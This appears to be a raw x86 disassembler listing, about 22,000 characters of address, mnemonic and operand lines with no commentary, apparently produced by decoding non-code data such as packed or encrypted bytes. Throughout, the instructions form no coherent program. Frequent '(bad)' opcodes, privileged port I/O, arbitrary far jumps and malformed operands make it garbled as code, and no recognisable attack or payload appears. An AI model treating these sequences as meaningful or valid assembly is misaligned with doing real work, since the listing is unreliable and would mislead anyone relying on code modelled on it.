  41e7cd:	add    edi,esp
  41e7cf:	xor    al,0xbd
  41e7d1:	fs mov esp,ss
  41e7d4:	mov    bl,0xb8
  41e7d6:	clc    
  41e7d7:	sub    bh,BYTE PTR ds:0x7eb41957
  41e7dd:	jno    0x41e776
  41e7df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7e0:	or     BYTE PTR [edi],dl
  41e7e2:	out    0x5a,al
  41e7e4:	pop    ecx
  41e7e5:	xchg   esp,eax
  41e7e6:	jno    0x41e81f
  41e7e8:	addr16 push 0xaaa1a487
  41e7ee:	in     al,0x16
  41e7f0:	jnp    0x41e7cb
  41e7f2:	data16 scas al,BYTE PTR es:[edi]
  41e7f4:	jne    0x41e85a
  41e7f6:	test   BYTE PTR [eax+0x32dded4a],bl
  41e7fc:	jecxz  0x41e80e
  41e7fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7ff:	push   0x157de8dd
  41e804:	out    dx,al
  41e805:	sub    DWORD PTR [eax],eax
  41e807:	iret   
  41e808:	sub    DWORD PTR ds:0x15aee3aa,esi
  41e80e:	js     0x41e84e
  41e810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e811:	out    0xdf,al
  41e813:	pop    ebp
  41e814:	sub    DWORD PTR [eax-0x5e],esp
  41e817:	in     al,dx
  41e818:	jge    0x41e7d5
  41e81a:	in     eax,dx
  41e81b:	pop    ebx
  41e81c:	cmp    al,BYTE PTR [esi+ebp*4]
  41e81f:	stc    
  41e820:	je     0x41e7b5
  41e822:	add    cl,BYTE PTR [edx+eiz*2+0x50]
  41e826:	push   edi
  41e827:	not    eax
  41e829:	cdq    
  41e82a:	sbb    eax,0x7248a936
  41e82f:	push   esi
  41e830:	test   DWORD PTR [edx],esi
  41e832:	bound  esp,QWORD PTR [esi]
  41e834:	add    ch,BYTE PTR [ebx+0x13211c04]
  41e83a:	(bad)  
  41e83c:	rcr    BYTE PTR [esi-0x1d],1
  41e83f:	arpl   WORD PTR [edx+0x1668f97e],sp
  41e845:	xchg   esi,eax
  41e846:	sbb    al,0xae
  41e848:	dec    edx
  41e849:	mov    ds:0xa487d7cd,al
  41e84e:	aas    
  41e84f:	iret   
  41e850:	cmp    BYTE PTR [ecx+0x64],bh
  41e853:	or     bh,BYTE PTR [ecx]
  41e855:	pop    ecx
  41e856:	out    dx,eax
  41e857:	mov    edx,0xc0095fc6
  41e85c:	btr    DWORD PTR [ebx],ecx
  41e85f:	lds    esi,FWORD PTR [edx]
  41e861:	jp     0x41e81e
  41e863:	add    ah,BYTE PTR [ecx+0x669fce7d]
  41e869:	pusha  
  41e86a:	push   0xffffffbf
  41e86c:	clc    
  41e86d:	rcl    BYTE PTR [eax-0x4b6b70],0xf2
  41e874:	fimul  WORD PTR [esi]
  41e876:	lods   al,BYTE PTR ds:[esi]
  41e877:	jmp    0x20d4ab67
  41e87c:	push   ecx
  41e87d:	fstp   QWORD PTR [edi+0x21]
  41e880:	xor    esi,DWORD PTR [ebx]
  41e882:	(bad)  
  41e883:	out    dx,eax
  41e884:	stos   DWORD PTR es:[edi],eax
  41e885:	cld    
  41e886:	ret    
  41e887:	jge    0x41e8ef
  41e889:	retf   0x70ff
  41e88c:	xchg   ecx,eax
  41e88d:	add    dl,ch
  41e88f:	xchg   DWORD PTR [ebp+0x5d],ecx
  41e892:	call   0xecfc:0xaaea09d0
  41e899:	shl    DWORD PTR [ebx],1
  41e89b:	test   al,0x8e
  41e89d:	cmp    eax,0xc0b702a4
  41e8a2:	out    dx,eax
  41e8a3:	fsubp  st(4),st
  41e8a5:	lods   eax,DWORD PTR ds:[esi]
  41e8a6:	sbb    ebx,DWORD PTR [eax+0x4e6c321a]
  41e8ac:	add    eax,0xf52a8e17
  41e8b1:	adc    edi,DWORD PTR [edi+ebp*1-0x4ec2f83f]
  41e8b8:	mov    cl,dl
  41e8ba:	cmp    bl,bl
  41e8bc:	cmp    al,0x11
  41e8be:	dec    edi
  41e8bf:	ds and al,cl
  41e8c2:	sti    
  41e8c3:	mov    al,ds:0xa40af423
  41e8c8:	mov    cl,0xdb
  41e8ca:	leave  
  41e8cb:	scas   eax,DWORD PTR es:[edi]
  41e8cc:	push   es
  41e8cd:	por    mm6,QWORD PTR [esi+0x6dead817]
  41e8d4:	ja     0x41e94c
  41e8d6:	dec    esi
  41e8d7:	cmp    dl,al
  41e8d9:	inc    edx
  41e8da:	cmp    esp,esp
  41e8dc:	gs sti 
  41e8de:	scas   al,BYTE PTR es:[edi]
  41e8df:	push   ebx
  41e8e0:	inc    esp
  41e8e1:	repz loop 0x41e93b
  41e8e4:	sti    
  41e8e5:	pop    esp
  41e8e6:	fs jge 0x41e8e9
  41e8e9:	sti    
  41e8ea:	sti    
  41e8eb:	sub    eax,DWORD PTR [edx+eiz*2]
  41e8ee:	das    
  41e8ef:	call   FWORD PTR [edi-0x4d]
  41e8f2:	pop    edx
  41e8f3:	mov    al,0xa5
  41e8f5:	lea    esp,[esi]
  41e8f7:	mov    ebp,0xfb5bb15e
  41e8fc:	jg     0x41e949
  41e8fe:	mov    ds:0x463f4c72,al
  41e903:	(bad)  
  41e905:	sti    
  41e906:	jmp    0x55546073
  41e90b:	pop    esp
  41e90c:	fcomp  QWORD PTR [edi-0x495d8f7f]
  41e912:	lds    edi,FWORD PTR [ebx+0x6389c9b1]
  41e918:	jnp    0x41e907
  41e91a:	push   esi
  41e91b:	(bad)  
  41e91c:	cmp    al,0x76
  41e91e:	push   eax
  41e91f:	xor    eax,0xef2ac83b
  41e924:	or     al,0x9c
  41e926:	pop    ebx
  41e927:	rcl    DWORD PTR [eax+eax*8-0x57355241],cl
  41e92e:	jecxz  0x41e970
  41e930:	mov    dl,0x0
  41e932:	xchg   edi,eax
  41e933:	or     esi,0x8
  41e936:	and    ax,0x4948
  41e93a:	adc    eax,0x9e1d6f4b
  41e93f:	push   gs
  41e941:	pushf  
  41e942:	loop   0x41e8d1
  41e944:	les    esi,FWORD PTR [edi]
  41e946:	xchg   ebp,eax
  41e947:	sbb    ecx,DWORD PTR [eax]
  41e949:	inc    ebp
  41e94a:	fucomp st(4)
  41e94c:	jmp    0x41e8f2
  41e94e:	mov    ebx,0xc0785c83
  41e953:	dec    edi
  41e954:	out    dx,eax
  41e955:	mov    eax,ds:0x420cf248
  41e95a:	ins    BYTE PTR es:[edi],dx
  41e95b:	inc    ecx
  41e95c:	mov    DWORD PTR [eax+0x44bfc275],edx
  41e962:	push   ss
  41e963:	cdq    
  41e964:	data16 sub al,BYTE PTR [ebx+0x288a1eee]
  41e96b:	fiadd  WORD PTR [edi+0x610b5994]
  41e971:	(bad)  
  41e973:	mov    ecx,0x8af77c
  41e978:	push   cs
  41e979:	jmp    0x6aa8:0x9aa33bf6
  41e980:	mov    esi,0x7432894f
  41e985:	gs jg  0x41e996
  41e988:	and    ebx,eax
  41e98a:	les    esi,FWORD PTR [esi-0x30]
  41e98d:	mov    edx,0xcf7e0f69
  41e992:	jno    0x41e9e5
  41e994:	pop    edx
  41e995:	in     al,dx
  41e996:	aas    
  41e997:	jmp    0x41e9ee
  41e999:	ja     0x41e93c
  41e99b:	daa    
  41e99c:	xlat   BYTE PTR ds:[ebx]
  41e99d:	mov    al,ds:0x1e91b264
  41e9a2:	push   ebx
  41e9a3:	adc    eax,0xd7387a6e
  41e9a8:	and    al,0x9e
  41e9aa:	fcomip st,st(2)
  41e9ac:	mov    ds:0x941e7c2b,eax
  41e9b1:	sub    DWORD PTR [edx],edx
  41e9b3:	and    esp,DWORD PTR [ebx-0x5cb16d8d]
  41e9b9:	add    DWORD PTR [ebp-0x2d],edi
  41e9bc:	sub    dh,ah
  41e9be:	sbb    dh,bl
  41e9c0:	jmp    0xd869:0xc763c21a
  41e9c7:	stc    
  41e9c8:	jmp    0xd8f3:0xf2ce6eac
  41e9cf:	daa    
  41e9d0:	jl     0x41e9f5
  41e9d2:	xor    ebp,DWORD PTR [eax+ecx*1]
  41e9d5:	out    0xbf,al
  41e9d7:	jp     0x41e9c8
  41e9d9:	xor    BYTE PTR [edi*8+0xe1c71a3],0xed
  41e9e1:	outs   dx,DWORD PTR ds:[esi]
  41e9e2:	cmp    dh,bh
  41e9e4:	mov    ebp,0xf74a2c43
  41e9e9:	inc    eax
  41e9ea:	mov    ecx,0xc4408e97
  41e9ef:	sbb    edi,edi
  41e9f1:	inc    esp
  41e9f2:	xor    edi,DWORD PTR [ebp+0x4ecd290b]
  41e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9f9:	leave  
  41e9fa:	mov    esp,0xcc1a2464
  41e9ff:	lods   al,BYTE PTR ds:[esi]
  41ea00:	inc    esp
  41ea01:	repnz mov ch,0x7c
  41ea04:	push   ds
  41ea05:	and    bl,BYTE PTR [esi]
  41ea07:	mov    cl,0xef
  41ea09:	dec    ecx
  41ea0a:	mov    eax,0xf19c0252
  41ea0f:	js     0x41e9fa
  41ea11:	add    bl,dl
  41ea13:	dec    ebx
  41ea14:	sub    eax,DWORD PTR [edi]
  41ea16:	jo     0x41ea33
  41ea18:	les    eax,FWORD PTR [eax-0x3aa3a02d]
  41ea1e:	push   es
  41ea1f:	mov    dl,bl
  41ea21:	sbb    DWORD PTR [ebp+0x68fa76f2],0x40
  41ea28:	sbb    ch,bh
  41ea2a:	jle    0x41e9b1
  41ea2c:	sbb    ch,BYTE PTR [esi-0x3f0778b5]
  41ea32:	mov    esi,ss
  41ea34:	inc    edi
  41ea35:	int3   
  41ea36:	dec    ebp
  41ea37:	stc    
  41ea38:	int    0x23
  41ea3a:	xor    ebx,edi
  41ea3c:	push   cs
  41ea3d:	xor    eax,0x2dd598fc
  41ea42:	xchg   edi,eax
  41ea43:	and    dh,BYTE PTR [edi+ecx*4]
  41ea46:	pusha  
  41ea47:	mov    eax,ds:0xf56e8759
  41ea4c:	sbb    eax,0xf1bc7282
  41ea51:	retf   0x37e5
  41ea54:	shl    BYTE PTR [ebx+0x52c05a3a],1
  41ea5a:	xor    DWORD PTR [ecx+0x33],0x6d
  41ea5e:	dec    esp
  41ea5f:	and    DWORD PTR [ebx+0x2596818c],esi
  41ea65:	push   edx
  41ea66:	jne    0x41e9f5
  41ea68:	xchg   DWORD PTR [eax+ebx*8-0x544efd1f],esi
  41ea6f:	pop    ds
  41ea70:	in     eax,dx
  41ea71:	add    eax,0xc3ee0052
  41ea76:	js     0x41ea86
  41ea78:	mov    ds:0x8904fb32,al
  41ea7d:	push   0xda8e326f
  41ea82:	pusha  
  41ea83:	mov    BYTE PTR [ecx],al
  41ea85:	xchg   BYTE PTR [ebp+ecx*4-0xb],ch
  41ea89:	add    ch,BYTE PTR [esi]
  41ea8b:	das    
  41ea8c:	or     eax,0xcf3a4ce2
  41ea91:	outs   dx,BYTE PTR ds:[esi]
  41ea92:	pop    ebp
  41ea93:	std    
  41ea94:	mov    edx,DWORD PTR [eax]
  41ea96:	jg     0x41ea34
  41ea98:	aas    
  41ea99:	pop    edx
  41ea9a:	imul   ebx,DWORD PTR [ebp-0x7c],0xffffffc0
  41ea9e:	mov    DWORD PTR [edi],eax
  41eaa0:	mov    al,ds:0xda771fd
  41eaa5:	rol    DWORD PTR [eax+0x4e],0x7
  41eaa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaaa:	das    
  41eaab:	and    BYTE PTR [ecx],cl
  41eaad:	mov    ah,0xd9
  41eaaf:	push   0xefb9d6dd
  41eab4:	(bad)  
  41eab6:	popf   
  41eab7:	stc    
  41eab8:	sub    al,0x74
  41eaba:	ffree  st(6)
  41eabc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eabd:	lods   eax,DWORD PTR ds:[esi]
  41eabe:	and    bl,BYTE PTR [eax-0x67]
  41eac1:	cld    
  41eac2:	mov    cl,0xc3
  41eac4:	fadd   QWORD PTR [edx+0x44]
  41eac7:	add    DWORD PTR [edx],ebx
  41eac9:	and    cl,BYTE PTR [edx+eiz*1]
  41eacc:	push   esi
  41eacd:	sar    DWORD PTR ds:0xfbf40778,0x6d
  41ead4:	loop   0x41eb13
  41ead6:	push   ss
  41ead7:	mov    ecx,esi
  41ead9:	adc    edi,DWORD PTR [edx+0x760db7e2]
  41eadf:	add    cl,bl
  41eae1:	jns    0x41eb47
  41eae3:	(bad)  
  41eae4:	pop    edx
  41eae5:	ins    DWORD PTR es:[edi],dx
  41eae6:	push   es
  41eae7:	mov    al,0xc
  41eae9:	add    DWORD PTR [ecx-0x1ed3862c],edi
  41eaef:	xchg   esi,eax
  41eaf0:	sti    
  41eaf1:	in     al,dx
  41eaf2:	jmp    0x41eae2
  41eaf4:	mov    BYTE PTR [ebp+0x2],dh
  41eaf7:	and    eax,0x29fd29a5
  41eafc:	or     ah,0xed
  41eaff:	pop    ecx
  41eb00:	ins    DWORD PTR es:[edi],dx
  41eb01:	and    eax,0xe74d62ce
  41eb06:	jmp    0x41ebf2
	...
  41ecdf:	add    dl,cl
  41ece1:	push   0xffffffe7
  41ece3:	ja     0x41eccc
  41ece5:	(bad)  
  41ece6:	(bad)  
  41ece8:	daa    
  41ece9:	inc    ebx
  41ecea:	call   0x28682e69
  41ecef:	mov    dl,0x31
  41ecf1:	rol    DWORD PTR [ecx],cl
  41ecf3:	add    BYTE PTR [esi],bl
  41ecf5:	pop    es
  41ecf6:	add    BYTE PTR [eax],al
  41ecf8:	mov    ebp,ecx
  41ecfa:	push   eax
  41ecfb:	sub    ecx,edx
  41ecfd:	inc    edi
  41ecfe:	in     eax,0x3
  41ed00:	cmp    dh,BYTE PTR [esp+ecx*4-0x52]
  41ed04:	test   al,0xd5
  41ed06:	ja     0x41ecf5
  41ed08:	sub    bh,ch
  41ed0a:	aas    
  41ed0b:	adc    al,0x1a
  41ed0d:	int3   
  41ed0e:	lahf   
  41ed0f:	dec    edx
  41ed10:	in     al,dx
  41ed11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed12:	jae    0x41ec9c
  41ed14:	call   0x862b:0x2a963729
  41ed1b:	xchg   edx,eax
  41ed1c:	push   ss
  41ed1d:	xchg   BYTE PTR [esi+esi*4],bh
  41ed20:	or     eax,0xa2b6f4d4
  41ed25:	das    
  41ed26:	arpl   bx,si
  41ed28:	sbb    eax,0x9aedd408
  41ed2d:	popa   
  41ed2e:	or     dl,dl
  41ed30:	inc    ebp
  41ed31:	fwait
  41ed32:	mov    cl,0xfa
  41ed34:	xchg   esi,eax
  41ed35:	jne    0x41ed04
  41ed37:	stc    
  41ed38:	rol    BYTE PTR [ecx+0x25daf0d6],1
  41ed3e:	jns    0x41ecd9
  41ed40:	pop    ebx
  41ed41:	push   ebx
  41ed42:	retf   
  41ed43:	or     al,0xf7
  41ed45:	inc    esi
  41ed46:	fdivr  QWORD PTR [edi+0x1ca68d4a]
  41ed4c:	sub    eax,0x2251d20b
  41ed51:	xchg   DWORD PTR [edi+0x2c],esp
  41ed54:	cmp    edi,ebx
  41ed56:	loopne 0x41edc0
  41ed58:	mov    ebx,0x8b90222
  41ed5d:	(bad)  
  41ed5e:	jns    0x41ed2a
  41ed60:	and    DWORD PTR [edi+0x4e7baed7],ecx
  41ed66:	inc    eax
  41ed67:	call   0x4b07:0x3652f766
  41ed6e:	inc    ebx
  41ed6f:	cmc    
  41ed70:	ret    
  41ed71:	or     al,0x13
  41ed73:	jne    0x41edbc
  41ed75:	add    cl,bl
  41ed77:	push   ebx
  41ed78:	fsubr  DWORD PTR [edi-0x77]
  41ed7b:	div    BYTE PTR [ebx]
  41ed7d:	mov    ah,0xd4
  41ed7f:	mov    esi,0x2ac1af2c
  41ed84:	xchg   edi,eax
  41ed85:	into   
  41ed86:	std    
  41ed87:	inc    ebp
  41ed88:	in     al,0x30
  41ed8a:	mov    ebp,0x1435e51
  41ed8f:	dec    esi
  41ed90:	(bad)  
  41ed91:	mov    dh,0x60
  41ed93:	mov    ebp,0x46a0be60
  41ed98:	test   DWORD PTR [ebp+ebp*8-0x6168a032],esi
  41ed9f:	mov    al,ds:0x974ead12
  41eda4:	cs iret 
  41eda6:	xor    DWORD PTR ds:0x25aaa377,ebx
  41edac:	clc    
  41edad:	aas    
  41edae:	pop    ss
  41edaf:	jo     0x41edf4
  41edb1:	pop    ebp
  41edb2:	dec    ebp
  41edb3:	jnp    0x41ee2e
  41edb5:	xchg   ebp,eax
  41edb6:	inc    edi
  41edb7:	mov    esp,0xf1ddcf61
  41edbc:	test   eax,0x1f1ab860
  41edc1:	(bad)  
  41edc2:	test   eax,0x819e1271
  41edc7:	cmp    al,0xf8
  41edc9:	push   esi
  41edca:	sahf   
  41edcb:	jmp    0xf9af89e1
  41edd0:	sbb    DWORD PTR [eax],edx
  41edd2:	adc    bl,cl
  41edd4:	dec    esp
  41edd5:	(bad)  
  41edd6:	fstp   QWORD PTR [ebx-0x40162f0a]
  41eddc:	jbe    0x41ed9e
  41edde:	pop    ds
  41eddf:	push   edi
  41ede0:	mov    ds:0x2c5ffecc,eax
  41ede5:	push   esi
  41ede6:	loope  0x41edf6
  41ede8:	aad    0x34
  41edea:	rol    DWORD PTR [ebp+0x2a],1
  41eded:	(bad)  
  41edee:	stos   DWORD PTR es:[edi],eax
  41edef:	mov    edx,0x120ee9ca
  41edf4:	dec    eax
  41edf5:	sub    al,0xc9
  41edf7:	das    
  41edf8:	mov    edx,es
  41edfa:	sbb    BYTE PTR [edx-0x3a],bh
  41edfd:	mov    DWORD PTR [eax],edi
  41edff:	(bad)  
  41ee00:	repnz addr16 (bad) 
  41ee03:	push   edi
  41ee04:	jmp    0x2a2dd840
  41ee09:	pop    edx
  41ee0a:	xchg   ecx,eax
  41ee0b:	and    eax,0x88eea7ba
  41ee10:	pushf  
  41ee11:	cmp    ah,BYTE PTR [esi+0xa3d52a5]
  41ee17:	push   ebx
  41ee18:	add    DWORD PTR [ecx+0x26],eax
  41ee1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee1c:	outs   dx,BYTE PTR ds:[esi]
  41ee1d:	ins    DWORD PTR es:[edi],dx
  41ee1e:	jge    0x41edbc
  41ee20:	lds    esi,FWORD PTR [ecx+0x323dc0b1]
  41ee26:	sbb    al,0x30
  41ee28:	xor    BYTE PTR [esi+0x4b8be56b],al
  41ee2e:	push   ebp
  41ee2f:	sub    al,0x37
  41ee31:	xchg   DWORD PTR [esi-0x4],ebp
  41ee34:	gs into 
  41ee36:	mov    esi,0xf5942c0e
  41ee3b:	jmp    0x3cc01248
  41ee40:	cld    
  41ee41:	mov    WORD PTR [edi],?
  41ee43:	xchg   esi,eax
  41ee44:	jno    0x41edfd
  41ee46:	xchg   DWORD PTR [ecx+0x2f4fa994],esi
  41ee4c:	push   ebx
  41ee4d:	es iret 
  41ee4f:	jge    0x41ede0
  41ee51:	xchg   DWORD PTR [ebp-0x4aa455bf],ebp
  41ee57:	add    esi,DWORD PTR [edi]
  41ee59:	and    dl,dl
  41ee5b:	dec    ebp
  41ee5c:	ins    BYTE PTR es:[edi],dx
  41ee5d:	xchg   ebp,eax
  41ee5e:	xor    BYTE PTR [edi],ch
  41ee60:	nop
  41ee61:	fidiv  WORD PTR [esi-0xbd498da]
  41ee67:	mov    dh,0xb8
  41ee69:	push   esi
  41ee6a:	jecxz  0x41ee69
  41ee6c:	cwde   
  41ee6d:	pop    ecx
  41ee6e:	sub    ecx,DWORD PTR [esp+edi*8]
  41ee71:	and    ch,BYTE PTR [ebp-0x2f]
  41ee74:	pop    esp
  41ee75:	mov    eax,0xaf294241
  41ee7a:	imul   esi,DWORD PTR [eax],0xcee00150
  41ee80:	add    eax,0xcbbccff6
  41ee85:	es xor dl,cl
  41ee88:	jge    0x41ee7a
  41ee8a:	aad    0xca
  41ee8c:	call   0xb0b1:0xf2436d6d
  41ee93:	jg     0x41ee72
  41ee95:	mov    WORD PTR [edi+eax*2+0x2],ds
  41ee99:	cwde   
  41ee9a:	adc    al,BYTE PTR [edi-0x4]
  41ee9d:	cmp    al,0xc7
  41ee9f:	hlt    
  41eea0:	int3   
  41eea1:	xchg   esi,eax
  41eea2:	cwde   
  41eea3:	scas   al,BYTE PTR es:[edi]
  41eea4:	hlt    
  41eea5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eea6:	adc    DWORD PTR [ebp+0x73],esi
  41eea9:	cli    
  41eeaa:	loop   0x41ee6c
  41eeac:	cld    
  41eead:	lods   al,BYTE PTR ds:[esi]
  41eeae:	lahf   
  41eeaf:	jnp    0x41ee3f
  41eeb1:	shr    cl,cl
  41eeb3:	dec    esp
  41eeb4:	pop    esp
  41eeb5:	(bad)  
  41eeb6:	mov    gs,WORD PTR [eax+0x8]
  41eeb9:	dec    ebp
  41eeba:	enter  0x471c,0x45
  41eebe:	cwde   
  41eebf:	ret    
  41eec0:	push   esi
  41eec1:	and    BYTE PTR [eax-0x6e],cl
  41eec4:	pop    ecx
  41eec5:	lahf   
  41eec6:	mov    ds:0x533db17c,al
  41eecb:	add    edx,ebx
  41eecd:	add    DWORD PTR [ebx-0x7a],edx
  41eed0:	mov    ebp,0x5f36146d
  41eed5:	mov    eax,ds:0x121ecefc
  41eeda:	stos   BYTE PTR es:[edi],al
  41eedb:	jmp    0x871d:0xf8baeb8f
  41eee2:	xchg   ebx,eax
  41eee3:	aad    0x45
  41eee5:	mov    esp,0x1bec196c
  41eeea:	xor    DWORD PTR [edi],esi
  41eeec:	retf   0xccd3
  41eeef:	lock jbe 0x41eeb2
  41eef2:	shl    BYTE PTR [esi-0x50168323],cl
  41eef8:	aas    
  41eef9:	xor    al,0x27
  41eefb:	add    al,0x3b
  41eefd:	jge    0x41eea3
  41eeff:	inc    ecx
  41ef00:	loope  0x41ef19
  41ef02:	jbe    0x41ef59
  41ef04:	adc    eax,0x2c539e46
  41ef09:	in     eax,0x84
  41ef0b:	stc    
  41ef0c:	scas   eax,DWORD PTR es:[edi]
  41ef0d:	or     eax,0x52bb6aa9
  41ef12:	rol    ah,1
  41ef14:	push   esi
  41ef15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef16:	fadd   DWORD PTR [edi-0x10]
  41ef19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef1a:	xor    al,bl
  41ef1c:	xchg   ecx,eax
  41ef1d:	popa   
  41ef1e:	mov    dl,0xd8
  41ef20:	adc    bl,dh
  41ef22:	inc    edx
  41ef23:	pushf  
  41ef24:	jo     0x41ef18
  41ef26:	or     DWORD PTR [ecx+eiz*2-0x509348be],eax
  41ef2d:	stos   DWORD PTR es:[edi],eax
  41ef2e:	mov    DWORD PTR [ebx-0x45],edx
  41ef31:	push   es
  41ef32:	mov    cl,0xa5
  41ef34:	push   ds
  41ef35:	repz add ecx,DWORD PTR ds:0x7ae2f638
  41ef3c:	xor    al,0x7e
  41ef3e:	les    esi,FWORD PTR [eax+edi*1]
  41ef41:	mov    ecx,DWORD PTR [ebp-0x60668dca]
  41ef47:	jp     0x41efaf
  41ef49:	stos   BYTE PTR es:[edi],al
  41ef4a:	cmc    
  41ef4b:	cmc    
  41ef4c:	mov    dl,0x46
  41ef4e:	and    eax,0xec3a1d43
  41ef53:	adc    al,BYTE PTR [edi+ebx*2]
  41ef56:	dec    ecx
  41ef57:	sahf   
  41ef58:	repz fisubr WORD PTR [eax-0x79]
  41ef5c:	pop    es
  41ef5d:	sub    esp,eax
  41ef5f:	(bad)  
  41ef60:	imul   BYTE PTR [eax-0x583c4583]
  41ef66:	sub    esp,eax
  41ef68:	hlt    
  41ef69:	scas   eax,DWORD PTR es:[edi]
  41ef6a:	leave  
  41ef6b:	int3   
  41ef6c:	les    edi,FWORD PTR [ecx+edi*1+0x38]
  41ef70:	jae    0x41efa4
  41ef72:	(bad)  
  41ef73:	ds out 0x23,al
  41ef76:	inc    edx
  41ef77:	js     0x41efbf
  41ef79:	leave  
  41ef7a:	je     0x41ef3a
  41ef7c:	lods   eax,DWORD PTR ds:[esi]
  41ef7d:	out    0x75,al
  41ef7f:	push   0x34
  41ef81:	cwde   
  41ef82:	lds    edi,FWORD PTR [edi+0x59558541]
  41ef88:	lods   eax,DWORD PTR ds:[esi]
  41ef89:	xchg   edx,eax
  41ef8a:	add    BYTE PTR [edi-0x9],0x56
  41ef8e:	(bad)  
  41ef8f:	ret    
  41ef90:	sbb    dh,BYTE PTR [edx+0x4]
  41ef93:	(bad)
  41ef96:	push   es
  41ef97:	or     BYTE PTR [edi+0x29],ah
  41ef9a:	jmp    0x99bc:0xc5a36dea
  41efa1:	shl    DWORD PTR [ebx+0x7],0xed
  41efa5:	test   eax,0xe1439ef5
  41efaa:	hlt    
  41efab:	(bad)  
  41efac:	neg    DWORD PTR [edi]
  41efae:	test   BYTE PTR [esi+edi*8+0x10ca2a4a],0x23
  41efb6:	add    edi,ebx
  41efb8:	dec    edi
  41efb9:	adc    edi,ecx
  41efbb:	into   
  41efbc:	sbb    ah,BYTE PTR [edx+0x70]
  41efbf:	rcr    bh,0xb7
  41efc2:	mov    ?,esp
  41efc4:	mov    ebp,0x2c38943e
  41efc9:	scas   al,BYTE PTR es:[edi]
  41efca:	outs   dx,DWORD PTR ds:[esi]
  41efcb:	inc    ebp
  41efcc:	jb     0x41ef69
  41efce:	ins    BYTE PTR es:[edi],dx
  41efcf:	mov    BYTE PTR [esi+ebp*2],dh
  41efd2:	adc    eax,eax
  41efd4:	sbb    cl,ah
  41efd6:	call   0x3674db53
  41efdb:	and    al,0xca
  41efdd:	or     al,0x60
  41efdf:	mov    cl,BYTE PTR [ecx-0xc]
  41efe2:	icebp  
  41efe3:	ins    BYTE PTR es:[edi],dx
  41efe4:	push   edi
  41efe5:	pusha  
  41efe6:	out    0x47,al
  41efe8:	loopne 0x41f02e
  41efea:	fdivr  QWORD PTR [ebp+0x4f959d5a]
  41eff0:	sbb    bh,al
  41eff2:	outs   dx,BYTE PTR ds:[esi]
  41eff3:	add    cl,BYTE PTR [edx]
  41eff5:	test   eax,0x1ab3fed0
  41effa:	push   edx
  41effb:	fwait
  41effc:	addr16 js 0x41f02a
  41efff:	jecxz  0x41efd4
  41f001:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41f003:	stos   BYTE PTR es:[edi],al
  41f004:	add    esi,esp
  41f006:	out    dx,al
  41f007:	mov    edx,0x531d69ca
  41f00c:	jmp    0x41f06a
  41f00e:	(bad)  
  41f00f:	and    edx,ecx
  41f011:	lock mov eax,ds:0xdb250f6a
  41f017:	dec    ecx
  41f018:	dec    esi
  41f019:	js     0x41f046
  41f01b:	jle    0x41efbc
  41f01d:	mov    bl,0x59
  41f01f:	repz arpl dx,cx
  41f022:	dec    ebx
  41f023:	ficom  WORD PTR [esi+0x56]
  41f026:	push   es
  41f027:	sti    
  41f028:	adc    eax,0x6c
  41f02b:	jno    0x41efeb
  41f02d:	stc    
  41f02e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f02f:	or     al,0xad
  41f031:	pop    esi
  41f032:	adc    bh,dh
  41f034:	sbb    eax,0xa5bd132a
  41f039:	and    BYTE PTR [esi+ecx*4],dl
  41f03c:	imul   eax,DWORD PTR [esi+0x2cc4fc2d],0x282677c0
  41f046:	sahf   
  41f047:	(bad)  
  41f048:	sub    dl,BYTE PTR [eax]
  41f04a:	and    ebp,DWORD PTR [ecx+0x4c4ede7e]
  41f050:	out    0xc6,al
  41f052:	jns    0x41f00d
  41f054:	iret   
  41f055:	cmp    BYTE PTR [ebx-0x1c],bl
  41f058:	sti    
  41f059:	or     BYTE PTR [ebp+0x795c7ebe],ah
  41f05f:	pusha  
  41f060:	sub    ch,ch
  41f062:	lock xchg DWORD PTR [eax],eax
  41f065:	adc    esi,esi
  41f067:	cmp    eax,0xd83c3308
  41f06c:	cmp    BYTE PTR [esi],bl
  41f06e:	std    
  41f06f:	push   edx
  41f070:	add    al,BYTE PTR [ecx+0x78]
  41f073:	mov    ss,WORD PTR [ebx-0x51]
  41f076:	int3   
  41f077:	call   0x66b5b940
  41f07c:	xchg   esi,eax
  41f07d:	jle    0x41f0b1
  41f07f:	das    
  41f080:	gs push ss
  41f082:	dec    ebx
  41f083:	sbb    DWORD PTR [ebp+0x3c],ebp
  41f086:	(bad)  
  41f087:	(bad)  
  41f088:	(bad)  
  41f089:	pop    edx
  41f08a:	mov    cl,0xd3
  41f08c:	jmp    0x59b1b4c9
  41f091:	outs   dx,DWORD PTR ds:[esi]
  41f092:	mov    dl,0xa4
  41f094:	push   es
  41f095:	mov    ecx,0x888a0cc6
  41f09a:	sar    DWORD PTR ds:0xb1be9a98,0xbe
  41f0a1:	repz dec edx
  41f0a3:	mov    edi,0xdfe7a26d
  41f0a8:	inc    ecx
  41f0a9:	mov    gs:0x2e07b006,al
  41f0af:	inc    DWORD PTR [ebp+0x46bb78ea]
  41f0b5:	in     al,dx
  41f0b6:	int3   
  41f0b7:	jns    0x41f0ba
  41f0b9:	out    dx,eax
  41f0ba:	pop    edi
  41f0bb:	leave  
  41f0bc:	pusha  
  41f0bd:	sub    esp,esp
  41f0bf:	mov    WORD PTR [ecx],ds
  41f0c1:	xchg   BYTE PTR [eax-0x54],al
  41f0c4:	js     0x41f10e
  41f0c6:	sbb    ebx,DWORD PTR [esp+ebx*1-0x364f9a3c]
  41f0cd:	and    eax,0x547ea785
  41f0d2:	lahf   
  41f0d3:	inc    eax
  41f0d4:	sahf   
  41f0d5:	mov    ebx,0x32e25062
  41f0da:	imul   eax,DWORD PTR [edx-0x15d8327f],0xffffff9a
  41f0e1:	add    al,0xd5
  41f0e3:	lds    ecx,FWORD PTR [ebx]
  41f0e5:	push   edx
  41f0e6:	cmp    ah,BYTE PTR [edi-0x102f5dd]
